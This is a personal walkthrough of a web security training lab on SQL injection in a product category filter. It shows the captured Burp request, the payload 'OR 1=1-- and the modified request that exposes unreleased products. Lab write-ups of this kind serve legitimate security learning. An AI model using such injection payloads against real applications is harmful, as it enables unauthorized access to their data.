*This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.*

Greeted with a home page with all the products. I clicked on the category *Gifts* and checked my HTTP History to see the request made: 
```Burp 
GET /filter?category=Gifts HTTP/2
Host: 0aec00570471e35680ee49f900bd0053.web-security-academy.net
Cookie: session=903nXpdEpJu5GGuQE5dPlKc1000JTccy
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aec00570471e35680ee49f900bd0053.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

Decided to send this to the Repeater and modify the query with the following injection : 
`'OR 1=1--` , so that the query is now : 

``SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1``
%% Be sure not to include a space between 1 and `--`%%

This retrieves all the products available and removes the restriction. 

Hence, the modified request in Repeater will look like this : 
```Burp 
GET /filter?category=Gifts'OR 1=1-- HTTP/2
Host: 0aec00570471e35680ee49f900bd0053.web-security-academy.net
Cookie: session=903nXpdEpJu5GGuQE5dPlKc1000JTccy
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aec00570471e35680ee49f900bd0053.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

This solves the lab!
![[Screenshot 2024-05-01 at 6.07.03 PM.png]]
